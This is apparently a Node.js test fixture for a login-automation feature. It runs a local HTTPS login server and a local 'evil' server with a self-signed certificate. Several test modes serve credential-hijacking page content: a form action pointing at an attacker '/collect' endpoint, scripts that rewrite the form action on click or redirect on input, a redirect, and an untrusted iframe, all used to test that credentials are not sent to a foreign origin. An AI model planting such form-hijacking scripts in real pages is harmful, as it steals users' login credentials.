import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { execFileSync } from 'node:child_process';
import { createServer } from 'node:https';
import { randomUUID, X509Certificate, createHash } from 'node:crypto';
export async function fixture() {
  const directory = await mkdtemp(join(tmpdir(), 'StartFlow-login-fixture-'));
  const script = join(directory, 'certificate.ps1');
  await writeFile(
    script,
    `param([string]$Directory)\n$ErrorActionPreference='Stop'\n$rsa=[Security.Cryptography.RSACng]::new(2048)\n$req=[Security.Cryptography.X509Certificates.CertificateRequest]::new('CN=localhost',$rsa,[Security.Cryptography.HashAlgorithmName]::SHA256,[Security.Cryptography.RSASignaturePadding]::Pkcs1)\n$san=[Security.Cryptography.X509Certificates.SubjectAlternativeNameBuilder]::new();$san.AddDnsName('localhost');$san.AddIpAddress([Net.IPAddress]::Parse('127.0.0.1'));$req.CertificateExtensions.Add($san.Build())\n$cert=$req.CreateSelfSigned([DateTimeOffset]::Now.AddMinutes(-5),[DateTimeOffset]::Now.AddDays(1))\n[IO.File]::WriteAllBytes((Join-Path $Directory 'test.pfx'),$cert.Export([Security.Cryptography.X509Certificates.X509ContentType]::Pfx,''))\n[IO.File]::WriteAllBytes((Join-Path $Directory 'test.cer'),$cert.Export([Security.Cryptography.X509Certificates.X509ContentType]::Cert))\n$cert.Dispose();$rsa.Dispose()\n`,
  );
  execFileSync('powershell.exe', ['-NoProfile', '-File', script, directory], {
    windowsHide: true,
    stdio: 'pipe',
  });
  const cert = new X509Certificate(await readFile(join(directory, 'test.cer')));
  const pin = createHash('sha256')
    .update(cert.publicKey.export({ type: 'spki', format: 'der' }))
    .digest('base64');
  const options = { pfx: await readFile(join(directory, 'test.pfx')), passphrase: '' };
  let origin = '',
    evilOrigin = '';
  const sessions = new Map(),
    users = new Map(),
    posts = new Map();
  let evilRequests = 0;
  const escape = (s) =>
    s.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('"', '&quot;');
  const logged = (u) => `<div id="success">已登录</div><span id="identity">${escape(u)}</span>`;
  const form = (mode, action = `${origin}/submit/${mode}`) =>
    `<form method="post" action="${action}"><input id="username" name="username" type="email" autocomplete="off"><input id="password" name="password" type="password" autocomplete="off"><button id="login" type="submit">登录</button></form>`;
  const evil = createServer(options, (req, res) => {
    evilRequests++;
    res.end('untrusted');
  });
  await new Promise((r) => evil.listen(0, '127.0.0.1', r));
  evilOrigin = `https://127.0.0.1:${evil.address().port}`;
  const server = createServer(options, async (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-store');
    const url = new URL(req.url, origin);
    const cookie = /sf_session=([^;]+)/.exec(req.headers.cookie ?? '')?.[1];
    const user = sessions.get(cookie);
    const mode = url.pathname.split('/').at(-1);
    if (url.pathname.startsWith('/login/')) {
      if (mode === 'redirect') {
        res.writeHead(302, { Location: evilOrigin + '/collect' });
        res.end();
        return;
      }
      if (user) {
        res.end(logged(user));
        return;
      }
      if (mode === 'captcha-frame') {
        res.end(`<iframe src="${evilOrigin}/recaptcha"></iframe>`);
        return;
      }
      if (['captcha', 'mfa', 'qr', 'passkey'].includes(mode)) {
        res.end(
          `<div data-mfa>人工验证 ${mode}</div><form method="post" action="${origin}/verify"><input id="otp" name="otp"><input id="identity-input" name="username"><button id="verify" type="submit">确认人工验证</button></form>`,
        );
        return;
      }
      if (mode === 'missing') {
        res.end('<div>没有配置的登录控件</div>');
        return;
      }
      const extra =
        mode === 'passkey-api'
          ? `<script>navigator.credentials.get({publicKey:{challenge:new Uint8Array(32),timeout:3000},mediation:'optional'}).catch(()=>{})</script>`
          : mode === 'mutation'
            ? `<script>document.querySelector('#login').addEventListener('click',()=>document.querySelector('form').action='${evilOrigin}/collect')</script>`
            : mode === 'redirect-on-input'
              ? `<script>document.querySelector('#username').addEventListener('input',()=>location.href='${evilOrigin}/collect')</script>`
              : '';
      res.end(form(mode, mode === 'evil-action' ? evilOrigin + '/collect' : undefined) + extra);
      return;
    }
    if (req.method === 'POST') {
      let body = '';
      for await (const b of req) {
        body += b;
        if (body.length > 8192) {
          res.writeHead(413);
          res.end();
          return;
        }
      }
      const params = new URLSearchParams(body);
      const username = params.get('username');
      posts.set(mode, (posts.get(mode) ?? 0) + 1);
      if (url.pathname === '/verify') {
        const key = randomUUID();
        sessions.set(key, username);
        res.setHeader(
          'Set-Cookie',
          `sf_session=${key}; Secure; HttpOnly; SameSite=Strict; Max-Age=3600; Path=/`,
        );
        res.end(logged(username));
        return;
      }
      if (mode === 'resubmit') {
        res.writeHead(307, { Location: origin + '/submit/resubmit' });
        res.end();
        return;
      }
      if (mode === 'timeout') {
        res.end('<div>处理中</div>');
        return;
      }
      if (mode === 'post-mfa') {
        res.end('<div data-mfa>请输入 MFA</div>');
        return;
      }
      if (mode === 'fail' || users.get(username) !== params.get('password')) {
        res.end('<div id="failure">登录失败</div>');
        return;
      }
      const key = randomUUID();
      sessions.set(key, username);
      res.setHeader(
        'Set-Cookie',
        `sf_session=${key}; Secure; HttpOnly; SameSite=Strict; Max-Age=3600; Path=/`,
      );
      res.end(logged(username));
      return;
    }
    res.writeHead(404);
    res.end();
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  origin = `https://127.0.0.1:${server.address().port}`;
  return {
    directory,
    origin,
    pin,
    users,
    posts,
    get evilRequests() {
      return evilRequests;
    },
    expire: () => sessions.clear(),
    config: (accountId, mode = 'normal') => ({
      id: randomUUID(),
      account_id: accountId,
      name: '测试登录',
      origin,
      login_url: origin + '/login/' + mode,
      form_action_url: origin + '/submit/' + mode,
      username_selector: '#username',
      password_selector: '#password',
      submit_selector: '#login',
      success_selector: '#success',
      identity_selector: '#identity',
      challenge_selector: '[data-challenge]',
      failure_selector: '#failure',
      timeout_seconds: 3,
    }),
    close: async function () {
      for (const session of this.sessions ?? []) await session.close();
      server.closeAllConnections();
      evil.closeAllConnections();
      await Promise.all([new Promise((r) => server.close(r)), new Promise((r) => evil.close(r))]);
      if (directory.startsWith(join(tmpdir(), 'StartFlow-login-fixture-')))
        await rm(directory, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 });
    },
  };
}
